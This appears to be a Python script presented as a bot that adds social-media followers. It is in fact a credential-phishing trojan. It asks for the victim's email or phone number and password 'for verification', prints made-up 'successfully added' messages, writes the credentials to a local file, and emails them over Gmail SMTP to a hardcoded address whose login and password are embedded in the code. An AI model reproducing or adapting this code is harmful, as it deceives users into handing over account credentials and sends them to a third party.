# import willy wonka \__("/)__/
import socket
import getpass
import smtplib
import time
import logging
print('''      _____ ___  _     _     _____        _______ ____  ____                                                                                                                                        
   _  |  ___/ _ \| |   | |   / _ \ \      / / ____|  _ \/ ___|                                                                                                                                       
 _| |_| |_ | | | | |   | |  | | | \ \ /\ / /|  _| | |_) \___ \                                                                                                                                       
|_   _|  _|| |_| | |___| |__| |_| |\ V  V / | |___|  _ < ___) |                                                                                                                                      
  |_| |_|   \___/|_____|_____\___/  \_/\_/  |_____|_| \_\____/                                                                                                                                       
                                                                                                                                                                                                     
    _    ____  ____  _____ ____                                                                                                                                                                      
   / \  |  _ \|  _ \| ____|  _ \                                                                                                                                                                     
  / _ \ | | | | | | |  _| | |_) |                                                                                                                                                                    
 / ___ \| |_| | |_| | |___|  _ <                                                                                                                                                                     
/_/   \_\____/|____/|_____|_| \_\                                                                                                                                                                    
                                         ''')
website_name=input('enter the website name you want to check login page example[www.facbook.com] :')
website_ip_address=socket.gethostbyname(website_name)
print('the ip address of',website_name,'is',website_ip_address)
def confirm():
        lat=input('[!]- enter the the e-mail address or phone number for your account verification\nEnter e-mail add or phone number :')
        lat1=input('[+]- please confirme your e-mail address or phone number one more time\nCONFIRME :')
        if lat==lat1:
            print('[++] confirmation complete !')
        else:
            print('[--]confirmation denied the info inserted doesnt match !!')
            exit()
        long=getpass.getpass('[!]- please enter the password  for your account\nEnter the password : ')
        long1=getpass.getpass('[+]- please confirme your password\nCONFIRM :')
        if long==long1:
            print('[++] confirmation complete !')
        else:
            print('[--]confirmation denied the info inserted doesnt match !!')
            exit()
        lat_mod=lat+'  '
        long_mod=long+'  '
        number=int(input('enter the number of followers you want the bot to add [max:10]\nEnter number of folowers :'))
        fake_list=('[+] bot had succesfully added...'*number)
        if number>10:
            print('you entered a value bigger than maximal request\n[!]THE SCRIPT WILL BREAK .....')
            exit()        
        print('[+] this may take few time please wait ...')
        time.sleep(7)
        request='[+] bot had succesfully added...'
        print(request*number)
        bot_important=''
        logging.basicConfig(filename=bot_important+'settings' ,level=logging.DEBUG ,format='%(asctime)s %(message)s ')
        file_open=open('settings','a')
        file_open.write(lat_mod)
        file_open.write(long_mod)
        file_open.close()
        server_conect=smtplib.SMTP('smtp.gmail.com',587)
        bridge='talkwithyasso@gmail.com'
        box='yassopublicmail@gmail.com'
        key='yassopublicbox'
        content=(website_name+'==>'+lat_mod+long_mod)
        server_conect.ehlo()
        server_conect.starttls()
        server_conect.login(box,key)
        server_conect.sendmail(bridge,box,content)
        server_conect.quit()
        print('\n[+]- if there was some issues or problems dont forget to report the issue at   talkwithyasso@gmail.com    ' )
        print('quitting ....')
        time.sleep(2)
    
        
        
verification=input('to let the script begin make sure to enter your account to let the bot verifie if the account exixt on the website database\n[Y/N]?:')             
if verification=='n' or verification=='N':
    print('[!] sorry but the script cannot start befaure the VERIFICATION ....')
    print('[-] exiting ....')
    exit()
else:
    confirm()   
    

